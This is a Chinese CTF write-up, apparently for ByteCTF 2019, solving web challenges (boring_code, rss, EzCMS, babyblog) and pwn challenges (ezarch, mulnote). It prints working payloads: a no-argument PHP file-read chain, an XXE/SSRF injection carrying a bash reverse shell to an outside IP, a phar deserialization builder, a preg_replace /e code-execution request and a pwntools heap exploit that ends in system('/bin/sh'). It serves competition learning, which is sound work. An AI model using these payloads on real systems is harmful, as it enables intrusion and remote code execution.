<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="39de01ca9cd491b1947b6fe1e723809d">Web</h1>
<h2 data-content="1" id="a14c6ccdadcc3cc1f0e3e21f41009718">boring_code</h2>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">function</span> <span class="nf">is_valid_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">filter_var</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="nx">FILTER_VALIDATE_URL</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/data:\/\//i'</span><span class="p">,</span> <span class="nv">$url</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'url'</span><span class="p">])){</span>
    <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'url'</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">is_valid_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$r</span> <span class="o">=</span> <span class="nb">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/baidu\.com$/'</span><span class="p">,</span> <span class="nv">$r</span><span class="p">[</span><span class="s1">'host'</span><span class="p">]))</span> <span class="p">{</span>
            <span class="nv">$code</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="s1">';'</span> <span class="o">===</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/[a-z]+\((?R)?\)/'</span><span class="p">,</span> <span class="k">NULL</span><span class="p">,</span> <span class="nv">$code</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span><span class="p">,</span> <span class="nv">$code</span><span class="p">))</span> <span class="p">{</span>
                    <span class="k">echo</span> <span class="s1">'bye~'</span><span class="p">;</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="k">eval</span><span class="p">(</span><span class="nv">$code</span><span class="p">);</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">"error: host not allowed"</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"error: invalid url"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span>
    <span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<h3 data-content="1" id="0af2078c6171b56bf36a5b827e13953f">第二层</h3>
<p>data:// 被干掉了，只能换思路，尝试绕了一圈没啥进展，那就先绕第二层吧。</p>
<p>再看下题目，明确好目标，flag 在上一级目录的 index.php 里，即 ../index.php，能读文件就行了。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190909124305-508c568e-d2bc-1.png"/></p>
<p>fuzz 一下，得到了不少函数，但能用的很少。还有一个 readfile 能用，简单思路如下：</p>
<pre><code>readfile('../index.php')
=&gt;  readfile(/var/www/html/index.php);
=&gt;  chdir('..')  =&gt;  readfile(end(scandir('.')));</code></pre>
<p><strong>第一个问题</strong>，'.' 从何来？一般直接用 <code>ord()</code> 构造，没错，这里也用这个。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190909124306-50fd6c66-d2bc-1.png"/><br/>
那就可以随便玩了，再结合一下 <code>time()</code>。<br/>
<strong>第二个问题</strong>，'..' 怎么来？<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190909124307-5162cf7a-d2bc-1.png"/><br/>
<strong>第三个问题</strong>，<code>chdir('..')</code> 没地方放，它的返回值是布尔型，那就丢 <code>time()</code> 吧，虽然是 <code>time(void)</code>，但也没影响 ：）。</p>
<p><strong>整理一下：</strong></p>
<pre><code>readfile(end(scandir(chr(time(chdir(next(scandir(chr(time())))))))));</code></pre>
<p>有人可能会觉得打中的概率太小了，那就一秒发一次，最多 256 次啊 ：）</p>
<h3 data-content="1" id="b3b9f0e3d9eefb88d98482a1fa4d174a">第一层</h3>
<p>正在一筹莫展的时候，叫队里师傅看了下，他随手丢了个链接出来。<strong>云屿师傅太强了!</strong><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190909124308-51f24a60-d2bc-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190909124308-52304b26-d2bc-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190909124309-52a12ef4-d2bc-1.png"/><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190909124309-52d515f2-d2bc-1.png"/></p>
<h2 data-content="1" id="a8f38d4f7e5683bf0835723d4532b00c">rss</h2>
<p>第一部分和 boring_code 一样，构造一个 baidu.com 的跳转，让其的返回是个 RSS。</p>
<p><a href="https://www.baidu.com/link?url=YuO-oavRIu9aTgoWy7-XSHsMTg2MOcNOtBULc64oZ3OEPnAp-IJ8Y2ui2vzhSPiL" target="_blank">https://www.baidu.com/link?url=YuO-oavRIu9aTgoWy7-XSHsMTg2MOcNOtBULc64oZ3OEPnAp-IJ8Y2ui2vzhSPiL</a></p>
<p>（不是我真的很想吐槽为啥跳到我的站能302，另外比较正常的做法不应该是注册一个aaaabaidu.com的域名吗喂）</p>
<p>尝试XXE读文件，确认可读，读到源码后确认是个裸得不能再裸的XXE转SSRF，直接打。</p>
<p>最终构造文件：<br/>
RSS:</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [</span>
<span class="cp">&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://127.0.0.1/rss_in_order?rss_url=http://www.zsxsoft.com/rss222.php&amp;order=id,1)%2Bsystem('bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F129.204.79.120%2F23458%200%3E%261%22')%2Bstrcmp(''" &gt;</span>
]&gt;
</pre></div>
<p>rss222.php</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;data&gt;</span>
    <span class="nt">&lt;channel&gt;</span>
        <span class="nt">&lt;item&gt;</span>
            <span class="nt">&lt;id&gt;</span>1<span class="nt">&lt;/id&gt;</span>
            <span class="nt">&lt;link&gt;</span>/hoge<span class="nt">&lt;/link&gt;</span>
        <span class="nt">&lt;/item&gt;</span>
        <span class="nt">&lt;item&gt;</span>
            <span class="nt">&lt;id&gt;</span>2<span class="nt">&lt;/id&gt;</span>
            <span class="nt">&lt;link&gt;</span>/foo<span class="nt">&lt;/link&gt;</span>
        <span class="nt">&lt;/item&gt;</span>
    <span class="nt">&lt;/channel&gt;</span>
<span class="nt">&lt;/data&gt;</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190909124310-538feaee-d2bc-1.png"/></p>
<h2 data-content="1" id="38562d21e9b6082cbfc9fd4facd8defa">EzCMS</h2>
<p>常见的反序列化点：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190909124311-540fef32-d2bc-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190909124312-544af2c6-d2bc-1.png"/></p>
<p>寻找有 open 方法的内置类，得到这两个：</p>
<pre><code>SessionHandler
ZipArchive</code></pre>
<p>session 没啥用，目光聚焦到 ZipArchive，看下文档发现有戏。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190909124312-549d472e-d2bc-1.png"/></p>
<p>生成 phar</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="k">class</span> <span class="nc">File</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$filename</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$filepath</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$checker</span><span class="p">;</span>

    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">checker</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Profile</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">Profile</span><span class="p">{</span>

    <span class="k">public</span> <span class="nv">$username</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$password</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$admin</span><span class="p">;</span>

    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">admin</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ZipArchive</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="s1">'/var/www/html/sandbox/9931f06e1af1fd77c1e95e84443dd6f6/.htaccess'</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">=</span> <span class="nx">ZIPARCHIVE</span><span class="o">::</span><span class="na">OVERWRITE</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="s2">"test.phar"</span><span class="p">);</span>
<span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">"test.phar"</span><span class="p">);</span>
<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">"&lt;?php __HALT_COMPILER();?&gt;"</span><span class="p">);</span>
<span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">File</span><span class="p">();</span>
<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span>
<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">"test.txt"</span><span class="p">,</span> <span class="s2">"test"</span><span class="p">);</span>
<span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
</pre></div>
<p>把 phar 传上去后，再按老套路弄下就 OK 了。</p>
<h2 data-content="1" id="30baa3ca72f646cb3078c506c08f8b71">babyblog</h2>
<p>edit.php</p>
<div class="highlight"><pre><span></span><span class="x">if($_SESSION['id'] == $row['userid']){</span>
<span class="x">        $title = addslashes($_POST['title']);</span>
<span class="x">        $content = addslashes($_POST['content']);</span>
<span class="x">        $sql-&gt;query("update article set title='$title',content='$content' where title='" . $row['title'] . "';");</span>
<span class="x">        exit("&lt;script&gt;alert('Edited successfully.');location.href='index.php';&lt;/script&gt;");</span>
<span class="x">    }</span>
</pre></div>
<p>$row['title'] 没有任何过滤，可以注入，拿到 vip 账号：wulax / 1。</p>
<p>发现题目本身是 PHP 5.3，又看到正则，估计考察点是 preg_replac e的 e 参数以及 %00 截断；发现disable_function 但已经被别人打fpm了，就跟别人后面直接 antsystem，就不自己打 fpm 了。</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/replace.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">112.126.101.16:9999</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.8,zh-CN;q=0.5,ja;q=0.3</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=--------1922216787</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">424</span>
<span class="na">DNT</span><span class="o">:</span> <span class="l">1</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Referer</span><span class="o">:</span> <span class="l">http://112.126.101.16:9999/replace.php?id=685</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=4jihl1fqnuugt8eqmoinpo1t47</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
<span class="na">Pragma</span><span class="o">:</span> <span class="l">no-cache</span>
<span class="na">Cache-Control</span><span class="o">:</span> <span class="l">no-cache</span>

----------1922216787
Content-Disposition: form-data; name="find"

bb%00/e
----------1922216787
Content-Disposition: form-data; name="replace"

eval($_POST['cc']);
----------1922216787
Content-Disposition: form-data; name="regex"

1
----------1922216787
Content-Disposition: form-data; name="id"

971
----------1922216787
Content-Disposition: form-data; name="cc"

var_dump(antsystem('/readflag'));
exit;
----------1922216787--
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190909124313-55498192-d2bc-1.png"/></p>
<h1 data-content="1" id="002a3d25cefd14c88e6e02dc0e2b87b2">Pwn</h1>
<h2 data-content="1" id="f4f4fb800b6725a67e76e5eb289ba82d">ezarch</h2>
<p>vm 结构</p>
<div class="highlight"><pre><span></span><span class="k">struct</span> <span class="nf">__attribute__</span><span class="p">((</span><span class="n">packed</span><span class="p">))</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">aligned</span><span class="p">(</span><span class="mi">2</span><span class="p">)))</span> <span class="n">Arch</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">text</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">stack</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">stack_size</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">mem_size</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="k">break</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">regs</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">_eip</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">_esp</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">_ebp</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kr">__int16</span> <span class="n">eflags</span><span class="p">;</span>
<span class="p">};</span>
</pre></div>
<p>每条指令长度为10</p>
<pre><code>0               1               2               3               4               5               6
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|    OpCode     |     Type      |                           Operand 1                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                           Operand 2                           |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

or

0               1               2               3               4
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|    OpCode     |     Type      |           Operand 1         ...
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
              ...               |           Operand 2         ...
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
              ...               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

OpCode:
    1 -&gt; add
    2 -&gt; sub
    3 -&gt; mov
    4 -&gt; xor
    5 -&gt; or
    6 -&gt; and
    7 -&gt; shift left
    8 -&gt; shift right
    9 -&gt; push
    10 -&gt; pop
    11 -&gt; call
    12 -&gt; ret</code></pre>
<p><code>漏洞点</code>:堆溢出，输入init_size比memory_size大就行</p>
<div class="highlight"><pre><span></span><span class="n">v8</span><span class="o">-&gt;</span><span class="n">memory</span> <span class="o">=</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="n">v7</span><span class="p">;</span>
            <span class="n">v9</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
            <span class="n">puts</span><span class="p">(</span><span class="s">"[*]Memory inited"</span><span class="p">);</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"[*]Inited size&gt;"</span><span class="p">,</span> <span class="n">argv</span><span class="p">);</span>
            <span class="n">__isoc99_scanf</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="s">"%llu"</span><span class="p">,</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">init_sz</span><span class="p">);</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"[*]Input Memory Now (0x%llx)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">init_sz</span><span class="p">);</span>
            <span class="k">while</span> <span class="p">(</span> <span class="n">v9</span> <span class="o">&lt;</span> <span class="n">init_sz</span> <span class="p">)</span>
            <span class="p">{</span>
              <span class="n">v11</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">virtual_machine</span><span class="o">-&gt;</span><span class="n">memory</span> <span class="o">+</span> <span class="n">v9</span><span class="p">);</span>
              <span class="k">if</span> <span class="p">(</span> <span class="n">init_sz</span> <span class="o">-</span> <span class="n">v9</span> <span class="o">&gt;</span> <span class="mh">0xFFF</span> <span class="p">)</span>
              <span class="p">{</span>
                <span class="n">v10</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">v11</span><span class="p">,</span> <span class="mh">0x1000uLL</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span> <span class="n">v10</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
                  <span class="k">goto</span> <span class="n">LABEL_26</span><span class="p">;</span>
              <span class="p">}</span>
              <span class="k">else</span>
              <span class="p">{</span>
                <span class="n">v10</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">v11</span><span class="p">,</span> <span class="n">init_sz</span> <span class="o">-</span> <span class="n">v9</span><span class="p">);</span>
                <span class="k">if</span> <span class="p">(</span> <span class="n">v10</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
<span class="nl">LABEL_26</span><span class="p">:</span>
                  <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
              <span class="p">}</span>
              <span class="n">v9</span> <span class="o">+=</span> <span class="n">v10</span><span class="p">;</span>
            <span class="p">}</span>
</pre></div>
<p>和对stack的ebp检查有误</p>
<div class="highlight"><pre><span></span><span class="n">_eeip</span> <span class="o">=</span> <span class="n">vmachine</span><span class="o">-&gt;</span><span class="n">_eip</span><span class="p">;</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">vmachine</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">_eeip</span> <span class="o">&gt;=</span> <span class="n">v2</span> <span class="o">||</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">vmachine</span><span class="o">-&gt;</span><span class="n">_esp</span> <span class="o">&gt;=</span> <span class="n">vmachine</span><span class="o">-&gt;</span><span class="n">stack_size</span> <span class="o">||</span> <span class="n">v2</span> <span class="o">&lt;=</span> <span class="n">vmachine</span><span class="o">-&gt;</span><span class="n">_ebp</span> <span class="p">)</span>
    <span class="k">return</span> <span class="mi">1LL</span><span class="p">;</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">exp</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">9999</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">host</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./ezarch'</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s1">'LD_PRELOAD'</span><span class="p">:</span><span class="s1">'./libc.so'</span><span class="p">})</span>
        <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="s1">'''</span>
<span class="s1">            c</span>
<span class="s1">        '''</span><span class="p">)</span>
    <span class="n">sa</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span>
    <span class="n">ru</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span>
    <span class="n">rl</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span>
    <span class="n">sla</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span>
    <span class="k">def</span> <span class="nf">Mem</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">code</span><span class="p">,</span> <span class="n">eip</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
        <span class="n">sla</span><span class="p">(</span><span class="s1">'&gt;'</span><span class="p">,</span> <span class="s1">'M'</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s1">'&gt;'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
        <span class="n">sla</span><span class="p">(</span><span class="s1">'&gt;'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">code</span><span class="p">)))</span>
        <span class="n">sa</span><span class="p">(</span><span class="s1">')'</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span>
        <span class="n">sla</span><span class="p">(</span><span class="s1">'eip&gt;'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">eip</span><span class="p">))</span>
        <span class="n">sla</span><span class="p">(</span><span class="s1">'esp&gt;'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">esp</span><span class="p">))</span>
        <span class="n">sla</span><span class="p">(</span><span class="s1">'ebp&gt;'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">ebp</span><span class="p">))</span>
    <span class="c1"># mov reg[0], stack[ebp]</span>
    <span class="n">opcode</span> <span class="o">=</span> <span class="s1">'</span><span class="se">\x03\x20</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span>
    <span class="c1"># sub reg[0], 0x20</span>
    <span class="n">opcode</span><span class="o">+=</span> <span class="s1">'</span><span class="se">\x02\x10</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span>
    <span class="c1"># mov stack[ebp], reg[0]</span>
    <span class="n">opcode</span><span class="o">+=</span> <span class="s1">'</span><span class="se">\x03\x02</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="c1"># now stack pointer to stderr, let's get it</span>
    <span class="n">opcode</span><span class="o">+=</span> <span class="s1">'</span><span class="se">\x0a\x00</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">opcode</span><span class="o">+=</span> <span class="s1">'</span><span class="se">\x0a\x00</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">Mem</span><span class="p">(</span><span class="mh">0x1010</span><span class="p">,</span> <span class="n">opcode</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x1008</span><span class="p">)</span>

    <span class="n">sla</span><span class="p">(</span><span class="s1">'&gt;'</span><span class="p">,</span> <span class="s1">'R'</span><span class="p">)</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'R1 --&gt; 0x'</span><span class="p">)</span>
    <span class="n">low</span> <span class="o">=</span> <span class="n">rl</span><span class="p">(</span><span class="n">keepends</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="n">ru</span><span class="p">(</span><span class="s1">'R2 --&gt; 0x'</span><span class="p">)</span>
    <span class="n">high</span> <span class="o">=</span> <span class="n">rl</span><span class="p">(</span><span class="n">keepends</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">high</span><span class="o">+</span><span class="n">low</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'_IO_2_1_stderr_'</span><span class="p">]</span>
    <span class="n">info</span><span class="p">(</span><span class="s2">"libc @ "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
    <span class="n">Mem</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="s1">'B'</span><span class="p">)</span>
    <span class="n">Mem</span><span class="p">(</span><span class="mh">0x1010</span><span class="p">,</span> <span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="o">*</span><span class="mh">0x1010</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">]</span><span class="o">-</span><span class="mi">8</span><span class="p">))</span>
    <span class="n">Mem</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="s1">'B'</span><span class="p">)</span>
    <span class="n">Mem</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="s1">'/bin/sh</span><span class="se">\x00</span><span class="s1">'</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'system'</span><span class="p">]))</span>
    <span class="n">sla</span><span class="p">(</span><span class="s1">'&gt;'</span><span class="p">,</span> <span class="s1">'M'</span><span class="p">)</span>
    <span class="n">sla</span><span class="p">(</span><span class="s1">'&gt;'</span><span class="p">,</span> <span class="s1">'1'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
    <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./ezarch'</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./libc.so'</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="n">exp</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="s1">'REMOTE'</span><span class="p">])</span>

<span class="c1"># bytectf{0ccf4027c269fcbd1d0a74ddd62ba90a}</span>
</pre></div>
<h2 data-content="1" id="dff72835f817186bc4031d0038732945">mulnote</h2>
<p>free的时候sleep了10秒,造成UAF</p>
